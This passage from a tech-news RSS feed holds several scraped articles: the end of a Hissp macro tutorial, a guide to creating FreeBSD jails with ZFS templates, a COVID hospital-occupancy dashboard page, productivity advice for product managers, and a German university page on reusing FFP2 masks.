<div><div><pre><span></span><span>#&gt;</span> <span>(</span><span>define</span> <span>squares</span> <span>(</span><span>map</span> <span>(</span><span>L</span> <span>(</span><span>x</span><span>)</span>
<span>#..</span>                       <span>(</span><span>mul</span> <span>x</span> <span>x</span><span>))</span>
<span>#..</span>                     <span>(</span><span>range</span> <span>10</span><span>)))</span>
<span>&gt;&gt;&gt; </span><span># define</span>
<span>... </span><span>__import__</span><span>(</span><span>'operator'</span><span>)</span><span>.</span><span>setitem</span><span>(</span>
<span>... </span>  <span>__import__</span><span>(</span><span>'builtins'</span><span>)</span><span>.</span><span>globals</span><span>(),</span>
<span>... </span>  <span>'squares'</span><span>,</span>
<span>... </span>  <span>map</span><span>(</span>
<span>... </span>    <span>L</span><span>(</span>
<span>... </span>      <span>x</span><span>(),</span>
<span>... </span>      <span>mul</span><span>(</span>
<span>... </span>        <span>x</span><span>,</span>
<span>... </span>        <span>x</span><span>)),</span>
<span>... </span>    <span>range</span><span>(</span>
<span>... </span>      <span>(</span><span>10</span><span>))))</span>
Traceback (most recent call last):
  File "&lt;console&gt;", line 7, in &lt;module&gt;
NameError: name 'x' is not defined
</pre></div>
</div>
<p>Not a syntax error, but it’s not working either.
Why not?
Quote the whole thing to see the Hissp tuples.</p>
<div><div><pre><span></span><span>#&gt;</span> <span>'</span><span>(</span><span>define</span> <span>squares</span> <span>(</span><span>map</span> <span>(</span><span>L</span> <span>(</span><span>x</span><span>)</span>
<span>#..</span>                        <span>(</span><span>mul</span> <span>x</span> <span>x</span><span>))</span>
<span>#..</span>                      <span>(</span><span>range</span> <span>10</span><span>)))</span>
<span>&gt;&gt;&gt; </span><span>(</span><span>'define'</span><span>,</span> <span>'squares'</span><span>,</span> <span>(</span><span>'map'</span><span>,</span> <span>(</span><span>'L'</span><span>,</span> <span>(</span><span>'x'</span><span>,),</span> <span>(</span><span>'mul'</span><span>,</span> <span>'x'</span><span>,</span> <span>'x'</span><span>)),</span> …</pre></div></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://hissp.readthedocs.io/en/v0.2.0/macro_tutorial.html">https://hissp.readthedocs.io/en/v0.2.0/macro_tutorial.html</a></em></p>]]>
            </description>
            <link>https://hissp.readthedocs.io/en/v0.2.0/macro_tutorial.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25813852</guid>
            <pubDate>Sun, 17 Jan 2021 19:13:32 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Creating Comfy FreeBSD Jails Using Standard Tools]]>
            </title>
            <description>
<![CDATA[
Score 112 | Comments 22 (<a href="https://news.ycombinator.com/item?id=25813800">thread link</a>) | @kettunen
<br/>
January 17, 2021 | https://kettunen.io/post/standard-freebsd-jails/ | <a href="https://web.archive.org/web/*/https://kettunen.io/post/standard-freebsd-jails/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		
		<div>
			<div>
			
<main role="main">
	<article>
		<div>
			<p><a href="https://www.docker.com/">Docker</a> has stormed into software development in
recent years. While the concepts behind it are powerful and useful, similar
tools have been used in systems for decades. FreeBSD’s
<a href="https://www.freebsd.org/doc/handbook/jails.html">jails</a> in one of those tools
which build upon even older <code>chroot(2)</code> To put it shortly, with these tools, you
can make a safe environment separated from the rest of the system.</p>
<p>Jails in FreeBSD is by no means a new tool (introduced in 4.X), but for a reason
or another, I haven’t used them that often, which is a shame since they are so
powerful. So I wanted to explore this concept in a concise and summarized
manner.</p>
<h2 id="templates">Templates</h2>
<p>ZFS datasets are a great way of creating templates for jails since, after the
template creation, you can easily create new jails with <code>zfs clone</code> or <code>zfs send/receive</code>. Typically people tend to divide jails to complete and service
jails, where the former usually resembles a real FreeBSD system, and the latter
is often dedicated to applications/services. I’ll cover complete jails for now.</p>
<p>The creation of templates starts with creating a dataset for your jail and
template. Here I’ll make a new dataset for the base installation of FreeBSD
12.2.</p>
<pre><code>$ sudo zfs create -o mountpoint=/vm zroot/vm
$ sudo zfs create zroot/vm/tmpl
$ sudo zfs create zroot/vm/tmpl/12.2
</code></pre><p>After that, fetch the base installation itself:</p>
<pre><code>$ fetch ftp://ftp.freebsd.org/pub/FreeBSD/releases/amd64/12.2-RELEASE/base.txz
# Fetch all the necessary stuff for your template, e.g. lib32 if needed
$ sudo tar -xJvpf base.txz -C /vm/tmpl/12.2
</code></pre><p>After that you should write a minimum viable <code>/etc/rc.conf</code> for the template:</p>
<pre><code>$ sudo emacs /vm/tmpl/12.2/etc/rc.conf
</code></pre><blockquote>
<p><strong>Note</strong>: Refer to <code>rc.conf(5)</code>.</p>
</blockquote>
<pre><code># Start or stop services
sendmail_enable="NO"
sendmail_submit_enable="NO"
sendmail_outbound_enable="NO"
sendmail_msp_queue_enable="NO"
syslogd_flags="-ss"
cron_flags="-J 60"
</code></pre><p>You can also disable some unnecessary jobs for jails:</p>
<pre><code>$ sudo emacs /vm/tmpl/12.2/etc/periodic.conf
</code></pre><blockquote>
<p><strong>Note</strong>: Refer to <code>periodic.conf(5)</code>.</p>
</blockquote>
<pre><code># No output for successful script runs.
daily_show_success="NO"
weekly_show_success="NO"
monthly_show_success="NO"
security_show_success="NO"
   
# Output to log files which are rotated by default.
daily_output="/var/log/daily.log"
daily_status_security_output="/var/log/daily.log"
weekly_output="/var/log/weekly.log"
weekly_status_security_output="/var/log/weekly.log"
monthly_output="/var/log/monthly.log"
monthly_status_security_output="/var/log/monthly.log"
   
# No need for those without sendmail
daily_clean_hoststat_enable="NO"
daily_status_mail_rejects_enable="NO"
daily_status_mailq_enable="NO"
daily_queuerun_enable="NO"
   
# Host does those
daily_status_disks_enable="NO"
daily_status_zfs_zpool_list_enable="NO"
daily_status_network_enable="NO"
daily_status_uptime_enable="NO"
daily_ntpd_leapfile_enable="NO"
weekly_locate_enable="NO"
weekly_whatis_enable="NO"
security_status_chksetuid_enable="NO"
security_status_neggrpperm_enable="NO"
security_status_chkuid0_enable="NO"
security_status_ipfwdenied_enable="NO"
security_status_ipfdenied_enable="NO"
security_status_ipfwlimit_enable="NO"
security_status_ipf6denied_enable="NO"
security_status_tcpwrap_enable="NO"
</code></pre><p>You also might want to enable ports in your jail:</p>
<pre><code>$ sudo mkdir /vm/tmpl/12.2/usr/ports
$ sudo mkdir -p /vm/tmpl/12.2/var/ports/{distfiles,packages}
$ sudo emacs /vm/tmpl/12.2/etc/make.conf
</code></pre><pre><code>WRKDIRPREFIX = /var/ports
DISTDIR = /var/ports/distfiles
PACKAGES = /var/ports/packages
</code></pre><p>Apply system updates to the template:</p>
<pre><code>$ sudo freebsd-update -b /vm/tmpl/12.2 fetch install
</code></pre><p>Lastly, take a snapshot:</p>
<pre><code>$ sudo zfs snapshot zroot/vm/tmpl/12.2@complete
</code></pre><p>This creates a snapshot of <code>zroot/vm/tmpl/12.2</code> named <code>complete</code>. You can then check your current snapshots with:</p>
<pre><code>$ sudo zfs list -t snapshot
</code></pre><h2 id="creating-jails-from-the-template">Creating Jails from the Template</h2>
<p>Now you should be able to create a new jail based on that snapshot. You can do
it either with <code>zfs clone</code> or <code>zfs send/receive</code>:</p>
<blockquote>
<p><strong>Difference Between the Two</strong></p>
</blockquote>
<blockquote>
<p>“A clone is a writable volume or file system whose initial contents are the
same as the dataset from which it was created. As with snapshots, creating a
clone is nearly instantaneous and initially consumes no additional disk
space. In addition, you can snapshot a clone.” [1]</p>
</blockquote>
<blockquote>
<p>“The zfs send command creates a stream representation of a snapshot that is
written to standard output. By default, a full stream is generated. You can
redirect the output to a file or to a different system. The zfs receive
command creates a snapshot whose contents are specified in the stream that is
provided on standard input. If a full stream is received, a new file system is
created as well. You can send ZFS snapshot data and receive ZFS snapshot data
and file systems with these commands. See the examples in the next section.”
[2]</p>
</blockquote>
<pre><code>$ sudo zfs clone zroot/vm/tmpl/12.2@complete zroot/vm/jail1

# OR

$ sudo sh -c "zfs send zroot/vm/tmpl/12.2@complete | zfs receive zroot/vm/jail1"
</code></pre><h2 id="jail-configurations">Jail Configurations</h2>
<blockquote>
<p><strong>Note</strong>: These configurations is for very bare-bones jail, e.g. without any
mounts or advanced networking. Further configurations are discussed in future posts.</p>
</blockquote>
<pre><code># /etc/rc.conf

cloned_interfaces="lo0"

# PF is used for NAT and port forwarding.
pf_enable="YES"
pflog_enable="YES"

jail_enable="YES"
jail_list="jail1"
</code></pre><blockquote>
<p><strong>Note</strong>: Refer to <code>jail.conf(5)</code>.</p>
</blockquote>
<pre><code># /etc/jail.conf

exec.start = "/bin/sh /etc/rc";
exec.stop = "/bin/sh /etc/rc.shutdown";
exec.clean;
mount.devfs;

host.hostname = $name;
path = "/vm/$name";
exec.consolelog = "/var/log/jail_${name}_console.log";
exec.prestart = "cp /etc/resolv.conf $path/etc";
exec.poststop = "rm $path/etc/resolv.conf";

jail1 {
        ip4.addr = "lo0|127.1.1.1/32";
        ip6.addr = "lo0|fd00:1:1:1::1/64";
        allow.chflags;
        allow.raw_sockets;
}
</code></pre><pre><code># /etc/hosts

...

127.1.1.1 jail1
fd00:1:1:1::1 jail1
</code></pre><h2 id="jail-management">Jail Management</h2>
<p>Start/stop all jails.</p>
<pre><code>$ sudo service jail start
</code></pre><p>Start/stop a specific jail(s).</p>
<pre><code>$ sudo service jail start jail1
</code></pre><p>Log in to jail.</p>
<pre><code>$ sudo jexec jail1
</code></pre><p>Exec a command on a jail.</p>
<pre><code>$ sudo jexec jail1 uname -a
FreeBSD jail1 12.2-RELEASE FreeBSD 12.2-RELEASE r366954 GENERIC  amd64
</code></pre><p>List running jails.</p>
<pre><code>$ jls
   JID  IP Address      Hostname                      Path
     3  127.1.1.1       jail1                         /vm/jail1
</code></pre><p>So that’s how you can spin up a simple restricted environment on your FreeBSD
system. There are still lots of things to cover in this topic, e.g., in-depth
networking and configurations. But I think those deserve their own posts. So see
you soon!</p>
<h2 id="notes">Notes</h2>
<p>[1] Overview of ZFS Clones: <a href="https://docs.oracle.com/cd/E19253-01/819-5461/gbcxz/index.html">https://docs.oracle.com/cd/E19253-01/819-5461/gbcxz/index.html</a></p>
<p>[2] Sending and Receiving ZFS Data: <a href="https://docs.oracle.com/cd/E18752_01/html/819-5461/gbchx.html">https://docs.oracle.com/cd/E18752_01/html/819-5461/gbchx.html</a></p>
<h2 id="references">References</h2>
<ul>
<li><a href="https://www.freebsd.org/doc/handbook/jails.html">FreeBSD Jails</a></li>
</ul>

		</div>
		
	</article>
</main>







			</div>
			
		</div>
		

	</div></div>]]>
            </description>
            <link>https://kettunen.io/post/standard-freebsd-jails/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25813800</guid>
            <pubDate>Sun, 17 Jan 2021 19:07:30 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: Explore Hospital Occupancy and Covid Patient Transfers]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25813299">thread link</a>) | @flixpar
<br/>
January 17, 2021 | https://covid-hospital-operations.com/patients-static | <a href="https://web.archive.org/web/*/https://covid-hospital-operations.com/patients-static">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>
			<h4>Hospital Occupancy Dashboard</h4>
		</p><div id="static-text-container">
			<p>
				<span id="static-page-p1">
					This interactive dashboard finds the best way to transfer COVID-19 patients between hospitals. You can use it to see which hospitals are over capacity, when and how many additional beds are needed at each hospital (or US state), and the optimal transfer strategy between hospitals.
				</span>
			</p>
			<p>
				<span data-for="static-page-p2">
					<i>How can we better manage COVID capacity in hospital systems?</i>
					<ion-icon name="caret-forward-outline"></ion-icon>
					<ion-icon name="caret-down-outline"></ion-icon>
					<br>
				</span>
				<span id="static-page-p2">
					With the ongoing COVID-19 pandemic, many hospitals across the US are at capacity or are quickly approaching it. Hospitals are coping with the COVID surge through a variety of methods, including opening up new beds, but these are often costly and can hurt the level of care that patients receive. This burden on hospitals can be reduced if we optimally transfer patients from over-capacity hospitals to nearby hospitals that have available space.
					To find the optimal number of patients to transfer and where to transfer them to, we use <a href="https://arxiv.org/abs/2011.03528">mathematical optimization models</a> developed by the <a href="https://systems.jhu.edu/">Johns Hopkins Center for Systems Science and Engineering</a> (JHU CSSE), hospitalization <a href="https://healthdata.gov/dataset/covid-19-reported-patient-impact-and-hospital-capacity-facility">data</a> from the US Department of Health and Human Services (HHS)<span>Latest data from 2021-01-10</span>, and COVID <a href="https://www.cdc.gov/coronavirus/2019-ncov/cases-updates/forecasts-cases.html">forecasts</a> from the US Centers for Disease Control (CDC)<span>Latest forecast from 2021-01-04</span>. To learn more, visit the <a href="https://covid-hospital-operations.com/about">About page</a>.
				</span>
			</p>
			<p>
				Select a state and patient type (ICU or acute) to see the results for <b><span data-contentid="start_date">2021-01-01</span></b> to <b><span data-contentid="end_date">2021-01-30</span></b>. <span>To select hospitals, go to the "Select Displayed Hospitals" section. For more options go to the "Customize Results" page.</span>
			</p>
			
		</div><div id="results-container">
			<div id="progressbar-area">
				<p>
					Updating...
					<br>
					Note: This site solves the optimization model in real time on our server, so you may have to wait briefly while it returns an answer.
				</p>
				</div>
			
			
		</div></div>]]>
            </description>
            <link>https://covid-hospital-operations.com/patients-static</link>
            <guid isPermaLink="false">hacker-news-small-sites-25813299</guid>
            <pubDate>Sun, 17 Jan 2021 18:23:30 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Productivity for Product Managers]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25813170">thread link</a>) | @laybak
<br/>
January 17, 2021 | https://informedpm.com/posts/productivity-for-product-managers | <a href="https://web.archive.org/web/*/https://informedpm.com/posts/productivity-for-product-managers">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
          <p><span>In a fast-moving product team, it can often feel like there is too much to do but too little time.</span></p> <p><span>I interviewed over 50 PMs last year about their workflows and processes. And here are the distilled learnings, along with advice from productivity gurus, to help you perform better.</span></p>  <p><h3><span>There is No Perfect System</span></h3></p> <p><span>Talking about productivity reminds me of the topic of health and fitness — Everyone has their own opinion. And it is tempting to spend hours perusing fitness blogs to eke out every last bit of "performance gain". All the while </span> <a href="http://www.paulgraham.com/selfindulgence.html" target="_blank"><span>feeling productive</span></a> <span>.</span></p> <p><span>As you work on improving your productivity, don't lose sight of why you're doing it. If your system takes more work to maintain than the time savings it provides, that defeats the whole purpose.</span></p> <p><span>And even if you are convinced that you have a "perfect" system, your needs will certainly evolve over time.</span></p>  <p><h3><span>Beware of Splintering</span></h3></p> <p><span>By far the most common problem from the PMs I talked to was that their team's information was scattered across tools. Ad-hoc Google Docs here. A flurry of Slack messages there. Some decisions were made in-person meetings, while others as comments on Jira tickets.</span></p> <p><span>To combat this, for every </span> <em>important</em> <span> topic, package all relevant context into a single document. This becomes the one place that you will maintain continually. And the one place that the team will check first for clarifications or updates, amidst the endless streams and threads. </span></p> <p><span>For a given topic, this is the hub that connects (and link to) all related fragments of truth.</span></p> <p><img src="https://storage.googleapis.com/rumin-gcs-bucket/newsletter/Hub.png"></p>  <p><h3><span>All-In-One Tools are a Myth</span></h3></p> <p><span>You have probably seen SaaS promising "everything in one place" or that they are the "only tool you will need for X". Well, productivity tools are rarely, if ever, the magic bullet that they like to market themselves to be.</span></p> <p><span>Tools are but one part of the story. An "OK" tool that your team actually uses is much more useful than the "perfect" tool that no one else adopts.</span></p> <p><span>Also, with each new tool you switch to, it comes with an onboarding cost for everyone. It takes time to adapt to a new workflow. And the migration of data often takes a non-trivial amount of work.</span></p> <p><span>Before buying into the promise of a shiny new tool, keep these considerations in mind. You likely don't need more (rigid) tools. There is no panacea.</span></p>  <p><h3><span>Progressively Organize</span></h3></p> <p><span>Being productive and being organized are not always the same thing. Your goal is to get more done, whereas staying organized is merely a means to an end.</span></p> <p><span>When there are more important things to do, organizing information for its own sake is wasteful. Don't let organizing become an excuse not to get real work done. Instead, let the important topics emerge. And then maintain those.</span></p> <p><span>This </span> <a href="https://sive.rs/walkways" target="_blank"><span>story</span></a> <span> from Derek Sivers illustrates the point. As a new college campus was getting built, one question was being debated — "Where in the grass should we put the paved walkways?" And here's the winning idea from one professor:</span></p> <div><blockquote><span>Don’t make any walkways this year. At the end of the year, look where the grass has worn away. That shows where the students are walking. Then just pave those paths.</span></blockquote></div>  <p><h3><span>Keeping Your Promises</span></h3></p> <p><span>If you say you’ll follow up, you better do it!</span></p> <p><span>The first step to not dropping the ball is making sure you </span> <em>capture</em> <span> your commitments or tasks. So this part of your process should have low friction. Good old sticky notes, task management apps, and note-taking apps are a few common ways to stay on top of this.</span></p> <p><span>And one common trap with sticky notes and to-dos is keeping track of them. To-do lists are meaningless if you don't remember to check them. For this reason, centralize your tasks in one place. This could mean using a single app to capture across devices, or regularly consolidating your commitments into one place after the initial capture.</span></p>  <p><h3><span>The 1-3-5 Rule</span></h3></p> <p><span>The </span> <a href="https://www.themuse.com/advice/a-better-todo-list-the-135-rule" target="_blank"><span>1-3-5 Rule</span></a> <span> is a simple idea that Alexandra Cavoulacos proposed. The premise is that since you can only fit so much in a day, you should keep your to-do list each day to only:</span></p> <p><li><span>1 big thing</span></li></p> <p><li><span>3 medium things</span></li></p> <p><li><span>5 little things</span></li></p>  <p><h3><span>Energy Management</span></h3></p> <p><span>"Time management" is a big topic. After all, how could you effectively manage a team's time and resources if you can't manage your own?</span></p> <p><span>But what is equally important but less often talked about is managing your energy and emotional states. Sometimes you just want to be in a deep focus state for strategy work. Sometimes you just want to blast music and power through emails. Sometimes you feel ready to dive into technical details.</span></p> <p><span>Each state of mind is conducive to certain types of work. It is beneficial to match the work you do with the state you are in, as opposed to just about scheduling tasks.</span></p> <p><span>And in the long run, it is worth asking this question to decide what you want to work on — </span> <a href="https://knowledgeartist.org/article/do-what-gives-you-energy" target="_blank"><span>What gives you energy?</span></a> <span>﻿</span></p>  <p><h3><span>Inbox Zero</span></h3></p> <p><span>Inbox Zero is the practice of keeping your email inbox empty.</span></p> <p><span>Ravi, founder of </span> <a href="https://www.getamna.com/" target="_blank"><span>Amna</span></a> <span>, advocates for establishing a process for triaging email. In particular, he uses the 4 D's in his process:</span></p> <p><li><span>Do: If you can do it now, just make it happen. Do this with emails that take less than 2 minutes to act on.</span></li></p> <p><li><span>Defer: If you can’t get to it now, add it to your to-do list or move these emails to a different folder.</span></li></p> <p><li><span>Delegate: If you believe another person is better suited to help with an issue, delegate it.</span></li></p> <p><li><span>Delete: If it’s spam, or it doesn’t require your attention, delete or archive it.</span></li></p> <p><span>Productivity guru </span> <a href="https://fortelabs.co/" target="_blank"><span>Tiago Forte</span></a> <span> has a similar approach. What he considers the "key to Inbox Zero" is to “touch each email only once.”</span></p>  <p><h3><span>Batching</span></h3></p> <p><span>Your attention is too precious to passively let it follow the most recent thing that demands it. Engage incoming messages and tasks on your terms.</span></p> <p><span>Turn off push notifications. Disable the notification badges on your desktop dock. Schedule dedicated time to check your email and DMs. And set clear communication expectations with your team.</span></p> <p><span>Instead of completing tasks in the order that they come, you can often save time by grouping similar tasks together. It reduces costly context switching and interrupts by consolidating repetitive tasks that are not time-sensitive.</span></p> <p><img src="https://storage.googleapis.com/rumin-gcs-bucket/newsletter/batch-processing.png"></p>  <p><h3><span>Don't Forget to Rest</span></h3></p> <p><span>As much as the industry and our culture like to glorify "the grind", it just isn't conducive to quality work. Nor is it sustainable. Take the time to recharge. Feed your brain with things unrelated to work. And dive back in refreshed and energized.</span></p>        
          
          
          <p><em>Every month, I send out a newsletter with the latest product learnings and insights.</em></p>
          <p><em>Enter your email below to subscribe.</em></p>

          
        </div></div>]]>
            </description>
            <link>https://informedpm.com/posts/productivity-for-product-managers</link>
            <guid isPermaLink="false">hacker-news-small-sites-25813170</guid>
            <pubDate>Sun, 17 Jan 2021 18:12:54 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[On re-use of FFP2 masks]]>
            </title>
            <description>
<![CDATA[
Score 17 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25813071">thread link</a>) | @tosh
<br/>
January 17, 2021 | https://www.fh-muenster.de/gesundheit/forschung/forschungsprojekte/moeglichkeiten-und-grenzen-der-eigenverantwortlichen-wiederverwendung-von-ffp2-masken-im-privatgebrauch/index.php | <a href="https://web.archive.org/web/*/https://www.fh-muenster.de/gesundheit/forschung/forschungsprojekte/moeglichkeiten-und-grenzen-der-eigenverantwortlichen-wiederverwendung-von-ffp2-masken-im-privatgebrauch/index.php">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>





                            <section id="content">


                                <a name="inhalt"></a>

                                                                
                                    
                                    <div>
                                        




	






   

   


   

   
      <div>
      




    
    <div>
    
    
    
    
    
    	
    
    
    
    
    

        
        
      
	
		
		
		
		
			
			
		
		
		
	
	
	
	
            <h2 id="a00">Erklärung des Projekts</h2>

<div>


            

                
                
                
                
                
                

                    <div>
                       


    
    
        
        
        
    
    
        
    
    
    
    
        
        
    
    
        
        
    
    

<div>

    

   
                    
   


<p><img src="https://www.fh-muenster.de/gesundheit/forschung/forschungsprojekte/moeglichkeiten-und-grenzen-der-eigenverantwortlichen-wiederverwendung-von-ffp2-masken-im-privatgebrauch/index.php.media/2011811/titel-kopf-mit-maske.png.scaled/fca7b4ee72013fbb3e460afbc78ef743.png" alt="Schematische Darstellung einer angelegten FFP2 Maske">
</p>


   

</div>





                    </div>

                


                

        
             


        
            
                
                
            
            <div><p><strong>Warum Wiederverwendung von FFP2-Masken für den Privatgebrauch?</strong></p>
<p>FFP2-Masken werden im Gesundheitswesen in Bereichen mit einem erhöhten Infektionsrisiko eingesetzt. Die als Einmalprodukt konstruierten FFP2-Masken sind nach der Nutzung zur Vermeidung weiterer Infektionsrisiken zu entsorgen. Bei der Nutzung von FFP2-Masken für den Privatgebrauch (z. B. Einkaufen) ist mit einer geringeren Erregerbelastung der FFP2-Masken zu rechnen. FFP2-Masken bieten bei richtiger Anwendung einen besseren Schutz als medizinische Gesichtsmasken (OP-Masken). Allerdings sind sie nur begrenzt verfügbar. Daher kann die Wiederverwendung von FFP2-Masken für den Privatgebrauch eine sinnvolle Ergänzung darstellen.</p>
<p>Die Belastung durch Bakterien und Viren wie SARS-CoV-2 ist ein wichtiger Punkt bei einer Wiederverwendung von Masken. Jeder Träger hinterlässt in der Maske Erreger der eigenen Nasen-, Rachen- und Hautflora. Diese lassen sich mit einfachen Verfahren nicht vollständig inaktivieren. Daher kommt nur eine personenbezogene Wiederverwendung in Betracht. Diese Infobroschüre zeigt die Vor- und Nachteile von zwei Alternativen zur Reduzierung möglicher SARS-CoV-2 Erreger: Verfahren "7 Tage trocknen bei Raumluft" und Verfahren "80 °C trockene Hitze".</p></div>
        

        


         

        

        

        
</div>

        


        
            
        

        
        
    </div>
    
    <div>
    
    
    
    
    
    	
    
    
    
    
    

        
        
      
	
		
		
		
		
			
			
		
		
		
	
	
	
	
            <h2 id="a01">Stabilität von SARS-CoV-2 auf/in FFP2-Masken</h2>

<div>


            

                
                
                
                
                
                

                    <div>
                       


    
    
        
        
        
    
    
        
    
    
    
    
        
        
    
    
        
        
    
    

<div>

    

   
                    
   


<p><img src="https://www.fh-muenster.de/gesundheit/forschung/forschungsprojekte/moeglichkeiten-und-grenzen-der-eigenverantwortlichen-wiederverwendung-von-ffp2-masken-im-privatgebrauch/index.php.media/2011812/oberflaeche-nicht-beruehren.png.scaled/01a6e2d959db8cf8399fa099e8b3abe2.png" alt="Gezeichnete Hand vor einer FFP2 Maske mit dem Hinweis " oberfläche="" nicht="" berühren!""="">
</p>


   

</div>





                    </div>

                


                

        
             


        
            
                
                
            
            <div><p>Für eine Zertifizierung als FFP2-Maske werden die Masken über 24 Stunden bei 70 °C gelagert und im Anschluss muss die Funktionsfähigkeit gewährleistet bleiben. Unsere Untersuchungen haben gezeigt, dass SARS-CoV-2 auf und in FFP2-Masken bei 70 °C nach über einer Stunde noch infektiös bleibt. Erst bei 80 °C trockener Hitze sind nach 60 Minuten keine infektiösen SARS-CoV-2 nachweisbar. Im Vergleich zu anderen Oberflächenmaterialen hat das Filtermaterial eine isolierende Wirkung, so dass die Ergebnisse zur Infektiösität auf anderen glatten Oberflächenmaterialien nicht übertragbar sind. Zudem haben die ersten Untersuchungen ergeben, dass SARS-CoV-2 auch bei Raumtemperatur auf dem porösen Maskenmaterial erst nach mehreren Tagen deutlich an Infektiösität abnimmt.</p>
<p><strong>Daher sollte eine FFP2-Maske nicht an aufeinanderfolgenden Tagen getragen werden.</strong></p></div>
        

        


         

        

        

        
</div>

        


        
            
        

        
        
    </div>
    
    <div>
    
    
    
    
    
    
    
    	
    
    
    
	
    

        
        
      
	
		
		
			
			
		
		
		
		
		
	
	
	
	
            <h2 id="a02">Maskenaufbau und Vielfalt</h2>

<div>


            

                
                
                
                
                
                


                

                    <div>
                       


    
    
        
        
        
    
    
        
    
    
    
    
        
        
    
    
        
        
    
    

<div>

    

   
                    
   


<p><img src="https://www.fh-muenster.de/gesundheit/images/forschung/ffp2/ffp-maske_infografik_neu_mit_querschnitt_3.png" alt="">
</p>


   

   
            
                </div>





                    </div>

                

        
             


        
            
                
                
            
            <div><p>FFP2-Masken haben unterschiedliche Formen und Haltebänder. Die Masken bestehen aus mehreren Lagen. In der Mitte befinden sich meistens 2-3 Lagen eines Filtervlies (sog. Meltblown Vlies). Das Filtervlies hat eine elektrostatische Ladung. Diese ermöglicht es, feinste Aerosole festzuhalten, die durch die reine Faserdichte des Gewebes nicht aufgefangen werden. Viele Desinfektionsverfahren reduzieren die elektrostatische Ladung und damit die Filterleistung.</p>
<p>Die Masken sind so gestaltet, dass sie an den Rändern dicht dem Gesicht anliegen. Zur Anpassung an die Nasenform ist über dem Nasenrücken ein Bügel angebracht, der vom Tragenden an die individuelle Nasenform anmodelliert werden muss. Ein wesentlicher baulicher Unterschied besteht zwischen Masken mit und solchen ohne Ausatemventil. Masken ohne Ausatemventil filtern sowohl die eingeatmete als auch die ausgeatmete Luft. Masken mit Ventil filtern nur die eingeatmete Luft und bieten kaum Fremdschutz, da die ausgeatmete Luft nicht gefiltert wird.</p>
<p><em><strong> ⇒ Wichtiger Hinweis</strong></em></p>
<p><em>Die Masken sollten nicht zum Trocknen auf/über die Heizung gelegt oder gehängt werden. 30 °C bis 40 °C sind für viele Bakterien und Pilze in feuchten Masken optimale Wachstumsbedingungen.</em></p></div>
        

        


         

        

        

        
</div>

        


        
            
        

        
        
    </div>
    
    <div>
    
    
    
    
    
    	
    
    
    
    
    

        
        
      
	
		
		
		
		
		
		
			
		
	
	
	
	
            <h2 id="a03">Möglichkeiten und Grenzen einfacher Desinfektionsverfahren SARS-CoV-2 und anderer Erreger</h2>



        


        
            
        

        
        
    </div>
    
    <div>
    
    
    
    
    
    	
    
    
    
    
    

        
        
      
	
		
		
			
			
		
		
		
		
		
	
	
	
	
            

<div>


            

                
                
                
                
                
                

                    <div>
                       


    
    
        
        
        
    
    
        
    
    
    
    
        
        
    
    
        
        
    
    

<div>

    

   
                    
   


<p><img src="https://www.fh-muenster.de/gesundheit/images/forschung/ffp2/masken_temperaturen_u70.svg" alt="Zeichnung einer FFP2-Maske">
</p>


   

</div>





                    </div>

                


                

        
             


        
            
                
                
            
            <div>
<p><strong>Unter 70°C</strong></p>
<p>SARS-CoV-2 kann infektiös bleiben und in der Maske befinden sich andere eigene Erreger der Nasen-, Rachen- und Hautflora.</p></div>
        

        


         

        

        

        
</div>

        


        

        
        
    </div>
    
    <div>
    
    
    
    
    
    	
    
    
    
    
    

        
        
      
	
		
		
			
			
		
		
		
		
		
	
	
	
	
            

<div>


            

                
                
                
                
                
                

                    <div>
                       


    
    
        
        
        
    
    
        
    
    
    
    
        
        
    
    
        
        
    
    

<div>

    

   
                    
   


<p><img src="https://www.fh-muenster.de/gesundheit/images/forschung/ffp2/masken_temperaturen_80.svg" alt="Zeichnung einer FFP2-Maske">
</p>


   

</div>





                    </div>

                


                

        
             


        
            
                
                
            
            <div>
<p><strong>Bei 80°C</strong></p>
<p>Bei 80°C sind nach 60 Minuten SARS-CoV-2 vollständig inaktiviert, andere Erreger deutlich reduziert. Die Filterleistung bleibt erhalten; die elastischen Haltebänder können an Zugkraft verlieren.</p></div>
        

        


         

        

        

        
</div>

        


        

        
        
    </div>
    
    <div>
    
    
    
    
    
    	
    
    
    
    
    

        
        
      
	
		
		
			
			
		
		
		
		
		
	
	
	
	
            

<div>


            

                
                
                
                
                
                

                    <div>
                       


    
    
        
        
        
    
    
        
    
    
    
    
        
        
    
    
        
        
    
    

<div>

    

   
                    
   


<p><img src="https://www.fh-muenster.de/gesundheit/images/forschung/ffp2/masken_temperaturen_u105.svg" alt="Zeichnung einer FFP2-Maske">
</p>


   

</div>





                    </div>

                


                

        
             


        
            
                
                
            
            <div>
<p><strong>Über 105°C</strong></p>
<p>Die Filterleistung kann deutlich beeinträchtigt werden und einzelne Kunststoffe können nicht sichtbare Materialschäden erleiden. Formstabile Masken (Körbchenmodelle) beginnen schon ab 90°C, sich zu verformen.</p></div>
        

        


         

        

        

        
</div>

        


        

        
        
    </div>
    
    <div>
    
    
    
    
    
    	
    
    
    
    
    

        
        
      
	
		
		
		
		
		
		
			
		
	
	
	
	
            

<div>


            


        
            
                
                
            
            <div><p>Unsere Untersuchungen haben gezeigt, dass SARS-CoV-2 erst bei Temperaturen von 80°C und einer Einwirkzeit von einer Stunde sicher auf und im Maskenmaterial inaktiviert werden können. Erreger der Nasen-, Rachen- und Hautflora können auf der Maske noch vorhanden sein. Daher darf eine bereits verwendete und erhitzte Maske auch nur von Ihnen selbst erneut getragen werden. Für den gleichen Träger der Maske sind diese (eigenen) Keime im Vergleich zu den (dann …</p></div></div></div></div></div></section></div></div>
